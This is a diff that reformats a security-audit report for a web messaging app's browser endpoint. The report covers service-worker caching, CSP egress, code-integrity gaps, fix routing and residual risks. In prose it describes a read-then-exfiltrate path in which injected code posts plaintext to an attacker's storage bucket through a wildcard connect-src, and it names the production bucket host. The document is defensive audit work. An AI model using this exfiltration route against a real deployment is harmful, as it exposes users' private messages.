+  `NavigationRoute`. No `runtimeCaching`/`registerRoute` over `/api`, `/ws`,
+  attachments, or auth exists anywhere (grep for
+  `runtimeCaching`/`NetworkFirst`/`StaleWhileRevalidate`/`CacheFirst`/`cache.put`/`caches.open`/`cache.add`
+  across `apps/web/src` returns only the `NavigationRoute` and the dead policy
+  helper). Precache glob is build-time static assets only
+  (`pwa-cache-policy.ts:1-11`), computed from `dist/` at build, so it cannot
+  contain a runtime response.
+- **Cached shell carries no secret.** The precached `index.html` is content-free
+  (`index.html:1-26`); the access token lives only in module memory
+  (`auth.ts:1-13`), and the persistent `argus_refresh` cookie is HttpOnly (not
+  in Cache Storage, not JS-readable; carries no key/content — RC-1).
+  `NavigationRoute` matches only `request.mode==='navigate'`; API calls go
+  through `apiFetch`→`/api/*` (`api-client.ts:62-72`) and attachments to
+  presigned B2 URLs (`attachments.ts:24-25,43`) — none are navigations, none
+  match, none are cached; decrypted attachment bytes become an in-memory `blob:`
+  URL only (`attachments.ts:50`).
+- **Push handler content-free.** Never reads `event.data`, caches, or logs
+  (`sw.ts:24-34`) — matches `web-push.md` §1. Stale-bundle resistance via
+  `cleanupOutdatedCaches()`, `registerType:'prompt'` with a `cache:'no-store'`
+  update fetch (`PwaUpdateProvider.tsx:53-56`), and Caddy `no-cache` on
+  everything except content-hashed assets (`Caddyfile:79-82`).
 
-**Why PROVEN.** No path writes ciphertext/plaintext/keys/tokens/presigned URLs to Cache Storage; the guarantee is the **absence** of any caching route, which is stronger than the (dead) policy helper. The findings are dead-code/test-hygiene only (SW-2 P3); the SW-1 "vestigial route" claim was **refuted** (a matching `/auth/callback` surface exists).
+**Why PROVEN.** No path writes ciphertext/plaintext/keys/tokens/presigned URLs
+to Cache Storage; the guarantee is the **absence** of any caching route, which
+is stronger than the (dead) policy helper. The findings are
+dead-code/test-hygiene only (SW-2 P3); the SW-1 "vestigial route" claim was
+**refuted** (a matching `/auth/callback` surface exists).
 
 ## Findings (confirmed / downgraded)
 
@@ -104,41 +333,159 @@ The SW runtime surface is exactly two cache-relevant operations and nothing else
 
 ### Refuted by the skeptic pass
 
-- **SW-1** (Vestigial `/auth/callback` entry in the navigate-fallback denylist) — **REFUTED**. The finding's premise ("no matching React route") is factually wrong: a `/auth/callback` surface exists (`sketch-data.ts:240-246` defines `path:'/auth/callback'`; `V2SketchRoute.tsx:25` maps it; `V2PageSketches.tsx:563` implements the "Completing sign-in" screen), so the denylist entry is a defensible forward-guard, not dead code. The no-leak half is also a non-issue: the denylist can only **exclude** a path from the fallback (the fail-safe direction), and the shell is content-free with a memory-only access token. Reduces to an optional one-line comment, below the bar for a security finding.
+- **SW-1** (Vestigial `/auth/callback` entry in the navigate-fallback denylist)
+  — **REFUTED**. The finding's premise ("no matching React route") is factually
+  wrong: a `/auth/callback` surface exists (`sketch-data.ts:240-246` defines
+  `path:'/auth/callback'`; `V2SketchRoute.tsx:25` maps it;
+  `V2PageSketches.tsx:563` implements the "Completing sign-in" screen), so the
+  denylist entry is a defensible forward-guard, not dead code. The no-leak half
+  is also a non-issue: the denylist can only **exclude** a path from the
+  fallback (the fail-safe direction), and the shell is content-free with a
+  memory-only access token. Reduces to an optional one-line comment, below the
+  bar for a security finding.
 
 ## Fix routing
 
 **P2 — each its own fix PR:**
-- **CDI-1 (MLS crypto chunks delivered with no integrity)** → own PR. Add a service-worker `fetch` handler that enforces the `bundle-manifest.json` sha384 on every `/assets/*.js` response (turns the dead Workbox path into a real preventive control and protects the edge/CDN leg cosign cannot). This is the single highest-value forward control in the slice — it also closes CDI-3's detective gap. Security gates: **crypto-reviewer** (manifest-hash enforcement, no fallback-to-unverified, fail-closed on mismatch) + **infra-reviewer** (SW caching/registration interaction, no new cache of sensitive responses); add a build-output guard (folds CDI-4) asserting every `/assets/*.js` chunk has a manifest entry the SW will check; Playwright check that a tampered chunk fails to load.
-- **CSP-1 (wildcard + path-style `connect-src` exfil egress)** → own PR. Replace `https://*.s3.eu-central-003.backblazeb2.com` with the exact **production** bucket host `https://attachment-r8xq4m7z2p9n6k3v.s3.eu-central-003.backblazeb2.com` — **derive the bucket from the deploy `ATTACHMENT_BUCKET`/`S3_BUCKET` (`infra/stack/deploy/deploy.sh:499`), NOT the dev-only `compose.prod.yaml` default `argus-attachments`, or every presigned upload/download will be CSP-blocked** — **AND remove the bare path-style endpoint `https://s3.eu-central-003.backblazeb2.com`** (prod uses virtual-host, `forcePathStyle` defaults `false` in `blob-config.ts:65`; a CSP host-source cannot path-restrict, so leaving the bare regional host lets injected code POST to any bucket via `…/<attacker-bucket>/…` and the exfil path survives). If prod is ever switched to path-style, CSP cannot tighten egress to one bucket — keep prod on virtual-host. Verify the live presigned-URL host form against `blob-config.ts`/`s3-blob-store.ts` before pinning. Security gate: **infra-reviewer** (CSP directive correctness against the real presigned-URL host) + add the CSP-3 header-assertion test in the same PR so the pinned directive is regression-guarded. _Pairs conceptually with CDI-1: together they are the full read-then-exfil chain, so landing both removes the active-attacker residual most decisively._
+- **CDI-1 (MLS crypto chunks delivered with no integrity)** → own PR. Add a
+  service-worker `fetch` handler that enforces the `bundle-manifest.json` sha384
+  on every `/assets/*.js` response (turns the dead Workbox path into a real
+  preventive control and protects the edge/CDN leg cosign cannot). This is the
+  single highest-value forward control in the slice — it also closes CDI-3's
+  detective gap. Security gates: **crypto-reviewer** (manifest-hash enforcement,
+  no fallback-to-unverified, fail-closed on mismatch) + **infra-reviewer** (SW
+  caching/registration interaction, no new cache of sensitive responses); add a
+  build-output guard (folds CDI-4) asserting every `/assets/*.js` chunk has a
+  manifest entry the SW will check; Playwright check that a tampered chunk fails
+  to load.
+- **CSP-1 (wildcard + path-style `connect-src` exfil egress)** → own PR. Replace
+  `https://*.s3.eu-central-003.backblazeb2.com` with the exact **production**
+  bucket host
+  `https://attachment-r8xq4m7z2p9n6k3v.s3.eu-central-003.backblazeb2.com` —
+  **derive the bucket from the deploy `ATTACHMENT_BUCKET`/`S3_BUCKET`
+  (`infra/stack/deploy/deploy.sh:499`), NOT the dev-only `compose.prod.yaml`
+  default `argus-attachments`, or every presigned upload/download will be
+  CSP-blocked** — **AND remove the bare path-style endpoint
+  `https://s3.eu-central-003.backblazeb2.com`** (prod uses virtual-host,
+  `forcePathStyle` defaults `false` in `blob-config.ts:65`; a CSP host-source
+  cannot path-restrict, so leaving the bare regional host lets injected code
+  POST to any bucket via `…/<attacker-bucket>/…` and the exfil path survives).
+  If prod is ever switched to path-style, CSP cannot tighten egress to one
+  bucket — keep prod on virtual-host. Verify the live presigned-URL host form
+  against `blob-config.ts`/`s3-blob-store.ts` before pinning. Security gate:
+  **infra-reviewer** (CSP directive correctness against the real presigned-URL
+  host) + add the CSP-3 header-assertion test in the same PR so the pinned
+  directive is regression-guarded. _Pairs conceptually with CDI-1: together they
+  are the full read-then-exfil chain, so landing both removes the
+  active-attacker residual most decisively._
 
 **Fixed in this PR (doc / comment / cheap-guard only, zero behaviour change):**
-- **S5-01** — mark `device-keystore.md` superseded by `prf-keystore-unlock.md` (or rewrite §1/§3.1/§5/§6 to the PRF model).
-- **S5-02 + F3** — re-path `importUnlockKey`/salt/IV references to `seal.ts` in `prf-keystore-unlock.md` and `csprng-audit.md`; **drop** the dead "backup salt (16 B)" inventory row.
-- **F1** — restate the key-non-extractable guarantee (unlock key = non-extractable `CryptoKey`; MLS privates = raw-in-heap by necessity, sealed at rest, never serialized toward server/logs) wherever the over-strong wording lives.
-- **CSP-4** — update `frontend-observability.md` + `code-delivery-integrity.md` to the passkey-only `connect-src` egress set (cross-reference the CSP-1 host pin).
-- **CDI-2** — correct `code-delivery-integrity.md:46-48` to state `revision:null` is cache-busting/freshness only, not content-hash integrity.
+- **S5-01** — mark `device-keystore.md` superseded by `prf-keystore-unlock.md`
+  (or rewrite §1/§3.1/§5/§6 to the PRF model).
+- **S5-02 + F3** — re-path `importUnlockKey`/salt/IV references to `seal.ts` in
+  `prf-keystore-unlock.md` and `csprng-audit.md`; **drop** the dead "backup salt
+  (16 B)" inventory row.
+- **F1** — restate the key-non-extractable guarantee (unlock key =
+  non-extractable `CryptoKey`; MLS privates = raw-in-heap by necessity, sealed
+  at rest, never serialized toward server/logs) wherever the over-strong wording
+  lives.
+- **CSP-4** — update `frontend-observability.md` + `code-delivery-integrity.md`
+  to the passkey-only `connect-src` egress set (cross-reference the CSP-1 host
+  pin).
+- **CDI-2** — correct `code-delivery-integrity.md:46-48` to state
+  `revision:null` is cache-busting/freshness only, not content-hash integrity.
 
-_(This PR is **docs-only** — it touches no code. OBS-2, although a one-line guard, is a code change and is spun off with SW-2 below to keep the evidence PR trivially mergeable.)_
+_(This PR is **docs-only** — it touches no code. OBS-2, although a one-line
+guard, is a code change and is spun off with SW-2 below to keep the evidence PR
+trivially mergeable.)_
 
-**Spun off (each its own behaviour-touching PR):** CDI-1 (P2) · CSP-1 (P2) · S5-03 (prefix message-log AAD + store-reset migration) · CSP-2 (codify HSTS as Cloudflare IaC + header smoke check) · CSP-3 (CI header-assertion — land with CSP-1) · CDI-3 (out-of-band `bundleDigest` anchor + SW self-verify — folds into CDI-1) · CDI-4 (SRI build-output guard — folds into CDI-1) · SW-2 + OBS-2 (delete dead cache-policy exports + their assertions, or wire the gate into a real route; and normalize the `err instanceof Error ? err.message : err` else-branch to `String(err)` at **every** live `console.warn` catch — `useMessageSending.ts`, `useConversationBackfill.ts`, `useLiveConversations.ts`, `join.ts`, `messaging.ts`, `ChatScreen.tsx` — bundled as one client-hygiene PR).
+**Spun off (each its own behaviour-touching PR):** CDI-1 (P2) · CSP-1 (P2) ·
+S5-03 (prefix message-log AAD + store-reset migration) · CSP-2 (codify HSTS as
+Cloudflare IaC + header smoke check) · CSP-3 (CI header-assertion — land with
+CSP-1) · CDI-3 (out-of-band `bundleDigest` anchor + SW self-verify — folds into
+CDI-1) · CDI-4 (SRI build-output guard — folds into CDI-1) · SW-2 + OBS-2
+(delete dead cache-policy exports + their assertions, or wire the gate into a
+real route; and normalize the `err instanceof Error ? err.message : err`
+else-branch to `String(err)` at **every** live `console.warn` catch —
+`useMessageSending.ts`, `useConversationBackfill.ts`, `useLiveConversations.ts`,
+`join.ts`, `messaging.ts`, `ChatScreen.tsx` — bundled as one client-hygiene PR).
 
-**Tracked residuals (no PR yet):** F2 (lock-on-idle / lock-on-hidden — optional defense-in-depth) · OBS-1 (add PII keys to the telemetry denylist, or delete the dormant module, when/if a sender is built).
+**Tracked residuals (no PR yet):** F2 (lock-on-idle / lock-on-hidden — optional
+defense-in-depth) · OBS-1 (add PII keys to the telemetry denylist, or delete the
+dormant module, when/if a sender is built).
 
 ## Guards added / not added
 
-**Added (in-PR, cheap):** the doc-honesty fixes that realign the keystore/CSPRNG/CSP threat models with the shipped PRF design (S5-01, S5-02, F1, F3, CSP-4, CDI-2) — closing the gap between what the docs claim and what the code does on the load-bearing at-rest and code-delivery controls. _(This PR is docs-only; no code guard ships here — the OBS-2 console normalization is spun off with SW-2.)_
+**Added (in-PR, cheap):** the doc-honesty fixes that realign the
+keystore/CSPRNG/CSP threat models with the shipped PRF design (S5-01, S5-02, F1,
+F3, CSP-4, CDI-2) — closing the gap between what the docs claim and what the
+code does on the load-bearing at-rest and code-delivery controls. _(This PR is
+docs-only; no code guard ships here — the OBS-2 console normalization is spun
+off with SW-2.)_
 
-**Not added (deferred to spun-off PRs):** the SW manifest-sha384 fetch handler that would actually close the dynamic-import integrity gap (CDI-1) and the CDI-3/CDI-4 controls that fold into it; the `connect-src` host pin (CSP-1); the CI header-assertion + `caddy validate` (CSP-3); HSTS-as-IaC + its smoke check (CSP-2); the message-log AAD prefix + store-reset migration (S5-03); the lock-on-idle/hidden zeroization (F2); the telemetry denylist hardening (OBS-1); the dead-code removal in `pwa-cache-policy.ts` + the `String(err)` console normalization (SW-2 + OBS-2).
+**Not added (deferred to spun-off PRs):** the SW manifest-sha384 fetch handler
+that would actually close the dynamic-import integrity gap (CDI-1) and the
+CDI-3/CDI-4 controls that fold into it; the `connect-src` host pin (CSP-1); the
+CI header-assertion + `caddy validate` (CSP-3); HSTS-as-IaC + its smoke check
+(CSP-2); the message-log AAD prefix + store-reset migration (S5-03); the
+lock-on-idle/hidden zeroization (F2); the telemetry denylist hardening (OBS-1);
+the dead-code removal in `pwa-cache-policy.ts` + the `String(err)` console
+normalization (SW-2 + OBS-2).
 
 ## Residual risk
 
-- **Active in-origin attacker can read-then-exfil (CDI-1 + CSP-1, both P2).** An attacker who lands code in the origin — via XSS the strict `script-src 'self'` makes hard, OR a swapped dynamic-import crypto chunk the SRI gap leaves unverified on the edge/CDN/cache leg — can read plaintext from the heap/IndexedDB and POST it to an attacker B2 bucket the wildcard `connect-src` permits. **Both halves are explicitly documented, maintainer-accepted residuals**; the SW manifest-enforcement handler (CDI-1) plus the host pin (CSP-1) close them. Bounded by: requiring a prior compromise, cosign protecting the build→origin leg, and the absence of any HTML-injection sink in app code.
-- **Unlocked-session heap exposure (F2, accepted).** While unlocked, `sessionKey` + raw MLS privates + decrypted state sit in React state with no idle/hidden zeroization; same-origin XSS reads keys directly and uses `sessionKey` as a decrypt oracle. Unavoidable in a browser, accepted in `device-keystore.md`, mitigated by the strict CSP.
-- **Verifiability gaps that ship a regression silently, not data:** no test pins the CSP/header set (CSP-3) or SRI presence (CDI-4); HSTS lives in no reviewable artifact (CSP-2); the Transparency page markets a same-origin self-check as independent verification (CDI-3). All hold today; each would degrade undetected on a careless future edit or dep bump.
-- **At-rest is genuinely sound for keys + content.** No passive leak of message plaintext or key bytes exists: one sealed IndexedDB, no API/content response cached, *access* token memory-only, message-log sealed before every write. A stolen, locked device yields only AES-256-GCM `SealedBlob`s under a non-extractable PRF key for all keys and content — the strongest result of the slice.
-- **RC-1 (refresh cookie persists at rest, P3).** The ~30-day `argus_refresh` **HttpOnly** cookie (`session-token.controller.ts:108`) is the one persistent secret on a stolen browser profile. It is by-design (revocable server-side, equivalent to "stay logged in"), is not JS-readable (XSS cannot exfil it), and carries **no key or message content** — so it does not weaken the crypto-at-rest claim — but a device thief could recover **auth/session/metadata** access until it expires or is revoked. Mitigation is the existing server-side revoke (logout-all) + the cookie's HttpOnly/secure/sameSite flags; tracked as a residual, not a Slice-5 defect (it is an intentional session-design choice).
+- **Active in-origin attacker can read-then-exfil (CDI-1 + CSP-1, both P2).** An
+  attacker who lands code in the origin — via XSS the strict `script-src 'self'`
+  makes hard, OR a swapped dynamic-import crypto chunk the SRI gap leaves
+  unverified on the edge/CDN/cache leg — can read plaintext from the
+  heap/IndexedDB and POST it to an attacker B2 bucket the wildcard `connect-src`
+  permits. **Both halves are explicitly documented, maintainer-accepted
+  residuals**; the SW manifest-enforcement handler (CDI-1) plus the host pin
+  (CSP-1) close them. Bounded by: requiring a prior compromise, cosign
+  protecting the build→origin leg, and the absence of any HTML-injection sink in
+  app code.
+- **Unlocked-session heap exposure (F2, accepted).** While unlocked,
+  `sessionKey` + raw MLS privates + decrypted state sit in React state with no
+  idle/hidden zeroization; same-origin XSS reads keys directly and uses
+  `sessionKey` as a decrypt oracle. Unavoidable in a browser, accepted in
+  `device-keystore.md`, mitigated by the strict CSP.
+- **Verifiability gaps that ship a regression silently, not data:** no test pins
+  the CSP/header set (CSP-3) or SRI presence (CDI-4); HSTS lives in no
+  reviewable artifact (CSP-2); the Transparency page markets a same-origin
+  self-check as independent verification (CDI-3). All hold today; each would
+  degrade undetected on a careless future edit or dep bump.
+- **At-rest is genuinely sound for keys + content.** No passive leak of message
+  plaintext or key bytes exists: one sealed IndexedDB, no API/content response
+  cached, *access* token memory-only, message-log sealed before every write. A
+  stolen, locked device yields only AES-256-GCM `SealedBlob`s under a
+  non-extractable PRF key for all keys and content — the strongest result of the
+  slice.
+- **RC-1 (refresh cookie persists at rest, P3).** The ~30-day `argus_refresh`
+  **HttpOnly** cookie (`session-token.controller.ts:108`) is the one persistent
+  secret on a stolen browser profile. It is by-design (revocable server-side,
+  equivalent to "stay logged in"), is not JS-readable (XSS cannot exfil it), and
+  carries **no key or message content** — so it does not weaken the
+  crypto-at-rest claim — but a device thief could recover
+  **auth/session/metadata** access until it expires or is revoked. Mitigation is
+  the existing server-side revoke (logout-all) + the cookie's
+  HttpOnly/secure/sameSite flags; tracked as a residual, not a Slice-5 defect
+  (it is an intentional session-design choice).
 
 ## BOTTOM LINE
 
-**Passively at rest the browser endpoint leaks no message plaintext or key bytes** — every key and the decrypted message-log are sealed AES-256-GCM under a non-extractable WebAuthn-PRF key in a single IndexedDB, no API/content/attachment response ever touches Cache Storage, and the *access* token is memory-only (the one persistent secret on a stolen profile is the HttpOnly `argus_refresh` cookie, RC-1, which grants auth/metadata access but no key or content); **actively it can be made to cough up plaintext or keys only after a prior in-origin compromise** — a swapped dynamic-import crypto chunk (no SRI on the edge/CDN leg, CDI-1) or XSS (which the strict `script-src 'self'` + absent sinks make hard), then exfiltrated through the wildcard `connect-src` (CSP-1) — and **that residual is real, bounded, and honestly documented** (both halves are maintainer-accepted; cosign covers the build leg; the two P2 fixes — an SW manifest-sha384 handler and a one-line `connect-src` host pin — close the active path), while the only material untruths found were stale threat-model docs claiming a passphrase/Argon2id/server-recovery model the code replaced with the PRF keystore.
+**Passively at rest the browser endpoint leaks no message plaintext or key
+bytes** — every key and the decrypted message-log are sealed AES-256-GCM under a
+non-extractable WebAuthn-PRF key in a single IndexedDB, no
+API/content/attachment response ever touches Cache Storage, and the *access*
+token is memory-only (the one persistent secret on a stolen profile is the
+HttpOnly `argus_refresh` cookie, RC-1, which grants auth/metadata access but no
+key or content); **actively it can be made to cough up plaintext or keys only
+after a prior in-origin compromise** — a swapped dynamic-import crypto chunk (no
+SRI on the edge/CDN leg, CDI-1) or XSS (which the strict `script-src 'self'` +
+absent sinks make hard), then exfiltrated through the wildcard `connect-src`
+(CSP-1) — and **that residual is real, bounded, and honestly documented** (both
+halves are maintainer-accepted; cosign covers the build leg; the two P2 fixes —
+an SW manifest-sha384 handler and a one-line `connect-src` host pin — close the
+active path), while the only material untruths found were stale threat-model
+docs claiming a passphrase/Argon2id/server-recovery model the code replaced with
+the PRF keystore.
